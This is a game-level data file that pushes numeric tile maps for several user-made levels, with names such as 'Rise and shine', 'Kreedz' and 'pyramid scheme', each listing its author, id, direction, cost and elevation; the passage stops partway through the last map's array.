maps.push({name="Rise and shine",author="Luffaren",id="#1659643367",direction="right",cost=193,elevation=10,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,90,9,9,0,0,0,0,0,0,0,0,0,0,9,65,65,65,65,9,9,9,90,9,0,0,0,0,0,0,0,0,0,0,9,65,65,65,65,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,9,65,65,65,65,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,9,65,65,65,65,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,16,16,15,14,13,12,11,10,9,9,0,0,0,0,0,0,0,0,0,0,16,16,15,14,13,12,11,10,9,9,0,0,0,0,0,0,0,0,0,0,16,16,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,119,119,119,19,19,19,19,0,0,0,0,0,0,19,19,19,19,19,1,1,119,119,119,19,19,19,19,39,39,39,39,39,39,19,19,19,19,2,1,1,119,119,119,19,19,19,19,39,39,39,39,39,39,19,19,19,19,2,1,1,119,119,119,19,19,19,19,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lazy Whirlpool",author="MoistNoodlez",id="#1659815171",direction="forward",cost=810,elevation=0,map=[1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,66,66,14,14,66,66,66,66,73,73,73,66,66,66,66,66,128,100,1,1,66,66,66,66,66,66,66,66,73,73,73,66,73,66,66,73,66,66,1,1,66,66,72,66,66,66,66,66,73,73,73,66,66,73,66,66,66,73,1,1,66,66,66,66,66,72,66,66,73,73,73,66,66,66,66,73,66,66,1,1,66,66,72,66,72,66,72,66,73,73,73,73,66,66,66,66,73,66,1,1,66,66,66,66,66,66,66,66,73,73,73,66,66,73,66,73,66,66,1,1,66,66,66,66,72,66,66,66,73,73,73,66,66,66,66,66,66,73,1,1,66,72,72,66,66,66,66,66,114,114,114,66,66,66,66,66,66,66,1,1,72,72,72,66,66,66,72,114,114,114,114,71,71,71,66,71,71,71,1,1,72,72,72,72,72,72,72,114,114,114,114,71,71,71,71,71,71,71,1,1,66,66,72,72,72,72,66,114,114,114,114,66,71,71,71,71,71,71,1,1,66,66,72,72,72,66,66,66,114,114,66,66,71,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,74,66,66,66,66,66,66,71,66,1,1,66,66,66,74,66,66,74,66,74,74,74,66,66,71,66,66,66,66,1,1,66,66,74,66,66,66,66,66,66,74,74,66,66,71,66,66,71,66,1,1,66,74,66,74,66,74,66,74,66,74,74,66,66,66,66,66,66,66,1,1,129,66,66,66,66,66,66,66,66,74,74,71,66,66,66,66,66,66,1,1,100,66,66,74,66,66,66,66,74,74,74,74,74,74,66,14,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="Kreedz",author="Asc3nded",id="#1659831754",direction="right",cost=262,elevation=13,map=[1,2,2,27,28,23,24,1,0,0,0,132,18,0,0,18,95,0,0,0,1,5,5,0,0,22,90,1,0,0,0,18,18,0,0,18,95,0,1,1,1,5,5,0,0,29,24,1,0,0,0,0,0,0,0,0,0,0,18,2,1,5,5,0,0,1,1,1,7,135,135,24,135,95,8,0,1,0,18,2,1,5,5,0,0,0,6,1,7,24,135,135,135,95,8,0,1,1,1,1,1,5,5,0,0,0,94,1,27,0,0,0,0,0,0,0,29,11,0,1,1,6,6,0,0,0,6,1,86,0,1,1,1,1,1,1,0,0,0,1,1,7,7,0,0,22,23,1,27,0,0,0,24,24,24,1,0,0,0,1,1,7,7,0,0,23,24,1,27,0,0,0,0,23,90,1,0,11,0,0,1,96,96,0,0,0,90,1,0,0,8,8,8,0,23,1,0,11,90,0,1,9,9,9,0,0,24,1,0,0,8,131,8,0,22,1,0,11,11,0,1,9,1,9,0,0,0,1,0,0,8,8,8,0,0,1,0,0,29,0,1,9,1,9,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,9,1,9,0,0,0,0,0,0,4,4,4,0,0,1,0,11,11,11,1,9,1,9,0,0,0,0,0,0,18,1,18,0,0,1,0,11,11,11,1,9,1,9,0,0,0,0,0,0,24,24,24,0,0,1,0,11,11,11,1,9,1,1,1,0,0,0,0,0,19,93,19,0,0,1,0,0,0,30,1,9,9,9,96,0,10,10,0,0,0,0,0,0,1,1,0,0,0,0,1,9,9,9,96,0,10,10,0,0,27,27,27,27,0,0,27,28,29,0,1,9,9,97,1,0,0,0,0,1,1,1,1,1,0,1,1,1,1,0]});
maps.push({name="MAKOOOO1",author="Headhunterz",id="#1659889127",direction="right",cost=230,elevation=-16,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,21,21,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,21,21,21,21,21,21,21,91,91,21,121,121,121,121,1,1,1,1,1,0,21,21,21,21,21,21,21,91,91,21,121,121,121,121,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,95,95,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,121,121,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,1,1,1,121,121,1,1,1,1,1,0,21,21,0,0,0,0,0,0,0,0,1,1,121,121,121,95,121,105,105,0,21,21,0,0,0,0,0,0,0,0,1,1,121,121,121,95,121,105,2,0,21,21,0,0,0,0,0,0,0,0,0,1,121,121,121,95,92,105,2,0,21,93,0,0,0,0,0,0,0,0,0,1,121,121,121,95,121,105,105,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="quickie holdie",author="king buzzo",id="#1659902090",direction="left",cost=261,elevation=11,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,5,5,5,5,6,0,0,0,0,0,0,0,2,16,16,16,16,0,0,6,6,6,6,6,6,0,0,0,0,0,0,0,2,16,76,76,16,0,0,90,65,65,65,65,90,0,0,0,0,0,0,0,0,16,16,76,16,0,0,7,1,7,1,7,6,0,0,0,0,0,0,0,0,0,16,76,16,0,0,7,65,7,65,7,6,0,0,0,0,0,0,0,16,16,16,16,16,0,0,7,7,7,7,7,6,0,0,0,0,0,0,0,16,1,1,16,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,16,16,16,16,0,0,0,1,95,95,95,1,0,0,0,0,0,0,0,0,0,130,130,0,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,130,130,0,0,0,0,0,7,7,7,7,130,130,130,130,7,7,93,0,0,130,130,0,0,0,0,0,7,7,7,7,130,130,130,130,7,7,7,0,0,24,24,0,0,0,0,0,7,7,0,0,0,0,0,0,94,7,7,0,0,24,24,0,0,0,10,8,7,7,8,10,0,0,0,0,130,130,130,0,0,91,91,0,0,0,10,8,8,8,8,10,0,0,0,0,130,130,130,0,0,91,91,0,0,0,10,10,10,10,10,10,0,0,0,0,130,130,130,0,0,24,24,0,0,1,1,1,95,95,1,0,0,0,0,0,130,130,130,0,0,24,24,24,24,92,0,0,10,95,10,8,7,0,0,92,7,7,7,0,0,24,24,24,24,92,0,0,10,95,10,8,7,0,0,92,7,7,7,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Bussy",author="MoistNoodlez",id="#1659903542",direction="forward",cost=191,elevation=0,map=[0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,1,100,1,1,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,17,124,17,1,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,1,14,67,14,1,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,1,14,125,14,1,0,0,0,0,1,1,1,111,111,1,1,1,0,0,0,1,88,14,88,1,0,0,0,0,0,0,1,113,113,1,0,0,0,0,0,1,88,14,88,1,0,0,0,0,0,0,1,115,115,1,0,1,1,1,1,1,88,14,88,1,0,0,0,0,0,0,1,117,117,1,0,1,88,14,88,14,88,14,88,1,0,0,0,0,0,0,1,119,119,1,0,1,14,88,14,88,14,14,88,1,0,0,0,0,0,0,1,121,121,1,0,1,88,14,14,14,14,14,88,1,0,0,0,0,0,0,1,123,123,1,1,1,1,113,113,1,17,14,14,1,0,0,0,0,0,0,1,123,95,121,119,117,115,113,113,1,124,14,14,1,0,0,0,0,0,0,1,95,123,121,119,117,115,113,113,1,17,14,14,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="fast lava uwu",author="king buzzo",id="#1659904100",direction="right",cost=347,elevation=12,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,34,34,34,90,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,34,76,76,34,1,1,1,1,0,0,0,0,0,0,0,0,1,34,34,34,34,76,76,34,34,34,34,1,0,0,0,0,0,0,0,0,1,34,76,76,76,76,76,76,76,76,34,1,0,0,0,0,0,0,34,34,34,86,76,34,34,1,1,34,34,76,86,1,0,90,24,24,2,34,34,34,1,34,76,76,76,1,1,76,76,76,34,1,0,24,65,24,2,34,1,34,1,34,34,34,34,1,1,34,34,34,34,1,0,24,24,24,0,34,0,34,0,24,24,24,34,24,24,34,24,24,24,1,0,130,130,130,0,0,0,0,0,24,34,34,34,24,24,34,34,34,24,1,0,130,130,130,0,34,34,34,0,85,76,76,1,92,92,1,76,76,85,1,0,130,130,130,0,0,0,36,0,24,34,76,1,34,34,1,76,34,24,1,0,130,130,130,0,0,0,38,0,24,34,34,34,90,34,34,34,90,24,1,0,130,130,130,0,0,1,95,1,24,24,24,24,76,76,24,24,24,24,1,24,24,24,24,24,0,0,40,0,0,0,0,24,90,24,24,1,1,1,1,24,76,76,76,24,0,0,40,40,92,24,24,0,24,24,1,1,1,1,1,24,76,76,76,24,0,0,0,0,0,0,0,0,95,95,24,24,86,24,86,24,24,24,24,90]});
maps.push({name="Caged Out",author="ZpLit",id="#1659923628",direction="forward",cost=262,elevation=-6,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,1,11,11,1,0,0,0,11,11,11,0,0,0,11,11,11,11,11,0,0,11,11,11,11,0,0,11,11,11,11,11,0,11,11,11,1,11,11,11,11,11,11,11,11,11,11,11,11,1,11,11,11,11,11,1,0,1,11,11,11,11,0,0,11,11,11,11,1,0,1,11,11,11,11,1,0,1,1,0,0,0,0,0,0,0,0,1,1,0,1,11,11,11,11,1,1,15,92,0,0,0,15,15,0,0,0,92,15,1,1,11,11,11,11,11,1,4,0,0,94,20,127,127,20,94,0,0,4,1,11,11,11,0,11,11,11,11,0,0,0,19,0,0,19,0,0,0,11,11,11,11,0,0,0,11,11,11,31,31,31,31,87,87,31,31,31,31,11,11,11,0,0,0,0,0,11,31,31,31,31,31,31,31,31,31,31,31,31,11,0,0,0,1,1,0,0,31,31,31,0,0,0,0,0,0,31,31,31,0,0,0,0,1,30,0,0,30,30,0,0,0,0,0,0,0,0,30,30,0,0,0,0,1,28,28,29,30,30,0,0,0,94,94,0,0,0,30,30,30,29,32,1,1,28,0,0,29,29,0,0,0,32,32,0,0,0,29,29,0,0,0,1,1,31,0,0,28,28,1,0,0,0,0,0,0,1,28,28,0,34,1,1,33,0,0,0,27,27,1,1,1,34,34,1,1,1,27,27,0,0,36,97,97,0,0,0,27,27,26,25,96,105,105,96,25,26,27,27,0,0,0,0,0,0,0,0,27,27,26,25,96,105,105,96,25,26,27,27,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0]});
maps.push({name="pyramid scheme",author="king buzzo",id="#1659925902",direction="forward",cost=184,elevation=7,map=[0,25,25,25,25,25,25,25,25,2,2,25,25,25,25,25,25,25,25,0,0,25,0,26,0,26,0,26,0,26,0,26,0,26,0,26,0,26,0,0,0,0,26,0,27,0,27,0,27,0,27,0,27,0,27,0,27,0,25,0,0,25,0,27,0,28,0,28,0,28,0,28,0,28,0,28,0,26,0,0,0,0,26,0,28,0,29,0,29,0,29,0,29,0,29,0,27,0,25,0,0,25,0,27,0,29,0,30,0,30,0,30,0,30,0,28,0,26,0,0,0,0,26,0,28,0,30,0,31,0,31,0,31,0,29,0,27,0,25,0,0,25,0,27,0,29,0,31,0,32,0,32,0,30,0,28,0,26,0,0,0,0,26,0,28,0,30,0,32,13,13,0,31,0,29,0,27,0,25,0,0,25,0,27,0,29,0,31,0,13,13,32,0,30,0,28,0,26,0,0,0,0,26,0,28,0,30,0,24,95,95,24,0,0,29,0,27,0,25,0,0,25,0,27,0,29,0,0,0,13,13,0,0,0,0,28,0,26,0,0,0,0,26,0,28,0,0,0,24,95,95,24,0,0,0,0,27,0,25,0,0,25,0,27,0,0,0,0,0,13,13,0,0,0,0,0,0,26,0,0,0,0,26,0,0,0,0,0,24,95,95,24,0,0,0,0,0,0,25,0,0,25,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,95,95,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,91,91,91,91,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,91,2,2,91,13,0,0,0,0,0,0,0]});
maps.push({name="rampescape",author="king buzzo",id="#1659955220",direction="left",cost=239,elevation=19,map=[24,24,24,24,24,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,24,24,24,132,24,0,0,5,5,5,5,0,0,0,0,19,131,19,0,0,2,24,24,24,24,0,0,5,65,65,5,0,0,0,0,0,19,0,0,0,2,24,0,0,0,0,0,5,65,65,5,0,0,0,0,19,0,19,0,0,24,24,0,0,0,0,0,5,5,5,5,0,0,0,0,0,19,0,0,0,24,24,0,12,12,12,12,12,12,12,95,12,0,0,0,19,19,19,19,0,0,0,0,12,11,10,9,8,7,6,5,0,0,0,0,19,59,59,19,0,0,0,0,12,11,10,9,8,7,6,5,0,0,0,0,19,59,59,19,0,0,0,19,95,19,19,19,19,19,19,19,0,0,0,0,0,24,24,0,0,0,0,0,12,19,19,19,19,19,19,19,0,0,0,0,24,76,76,24,0,0,0,0,12,13,14,15,16,17,18,19,0,0,0,24,76,76,76,24,0,0,0,0,12,13,14,15,16,17,18,19,0,0,95,76,76,76,76,24,0,0,0,0,24,24,24,24,24,24,24,19,24,24,95,24,24,24,76,24,0,0,0,0,24,24,24,23,22,21,20,19,0,0,95,76,76,76,76,24,0,0,0,0,24,24,24,23,22,21,20,19,0,0,0,24,76,76,76,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,76,76,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="dropper",author="king buzzo",id="#1659988033",direction="forward",cost=274,elevation=-19,map=[0,0,24,2,2,24,0,0,0,0,0,24,24,24,24,65,5,5,5,0,0,1,24,24,24,24,1,0,0,0,1,24,132,132,24,1,5,94,5,0,0,0,24,24,24,24,0,0,0,0,0,24,24,24,24,65,5,5,5,0,0,0,19,24,24,19,0,0,0,0,0,19,24,24,19,65,5,5,5,0,0,0,19,65,65,19,0,0,0,0,0,19,65,65,19,65,5,93,5,0,0,1,19,65,65,19,1,0,0,0,1,19,65,65,19,1,5,5,5,0,0,0,19,19,19,19,0,0,0,0,0,19,19,19,19,92,5,5,5,0,0,0,14,19,19,14,0,0,0,0,0,14,19,19,14,92,5,5,5,0,1,97,14,65,65,14,97,1,0,1,99,14,65,65,14,99,1,0,0,0,0,1,14,65,65,14,1,0,0,0,1,14,65,65,14,1,0,0,0,0,0,0,1,96,96,1,0,0,0,0,0,1,98,98,1,0,0,0,0,0,0,0,9,14,14,9,0,0,0,0,0,9,14,14,9,0,0,0,0,0,0,0,9,65,65,9,0,0,0,0,0,9,65,65,9,0,0,0,0,0,0,1,9,65,65,9,1,0,0,0,1,9,65,65,9,1,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,5,9,9,5,0,0,0,0,0,5,9,9,5,0,0,0,0,0,0,0,5,65,65,5,0,0,0,0,0,5,65,65,5,0,0,0,0,0,0,1,5,65,65,5,1,0,0,0,1,5,65,65,5,1,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,131,131,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="1",author="fantasy",id="#1659990513",direction="forward",cost=400,elevation=0,map=[5,5,5,5,5,5,5,5,24,2,2,24,5,5,5,5,5,5,5,5,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,5,94,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,5,94,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,5,5,5,5,5,5,5,5,24,2,2,24,5,5,5,5,5,5,5,5]});
maps.push({name="2",author="fantasy",id="#1659990530",direction="forward",cost=52,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0]});
maps.push({name="3",author="fantasy",id="#1659990548",direction="right",cost=90,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,24,24,24,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,24,24,24,24,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="4",author="fantasy",id="#1659990565",direction="forward",cost=268,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,3,5,5,5,5,5,5,5,5,5,3,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24,24,24,24,24,24,100]});
maps.push({name="6",author="fantasy",id="#1659990613",direction="forward",cost=52,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="7",author="fantasy",id="#1659990633",direction="forward",cost=617,elevation=0,map=[1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,100,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,66,66,66,66,66,5,5,66,66,66,66,66,66,66,5,66,1,1,66,66,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,66,66,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,66,66,66,66,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,66,66,66,66,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,66,66,66,66,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,66,66,66,66,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,5,5,5,5,1,1,66,66,5,5,66,66,66,5,5,66,66,66,5,5,5,5,93,5,1,1,66,66,5,5,66,66,66,94,5,66,66,66,66,66,66,66,66,66,1,1,66,66,5,5,66,66,66,5,5,66,66,66,66,66,66,66,66,66,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="8",author="fantasy",id="#1659990651",direction="forward",cost=280,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,17,17,17,17,17,17,16,0,0,0,0,0,0,0,0,0,0,0,16,17,17,17,17,17,17,17,17,17,17,16,0,0,0,0,0,0,0,0,17,17,17,18,18,18,18,17,17,17,17,17,16,0,0,0,0,0,0,16,17,17,17,18,18,19,19,18,18,17,17,17,16,0,0,0,0,0,16,17,17,17,18,18,19,19,19,19,18,18,17,17,16,0,0,0,0,0,16,17,17,18,18,18,19,19,19,19,18,18,17,17,17,0,0,0,0,0,16,17,17,18,18,19,19,20,20,19,19,18,18,17,17,16,0,0,0,0,16,17,17,18,18,19,19,20,20,19,19,18,18,18,17,16,0,0,0,0,17,17,17,18,18,19,19,20,21,20,19,19,18,18,17,17,0,0,0,0,17,17,17,18,18,19,19,20,21,20,19,19,18,18,17,17,16,0,0,0,17,17,17,18,18,18,19,19,20,21,20,19,19,18,18,17,16,0,0,0,16,17,17,18,18,18,19,19,19,2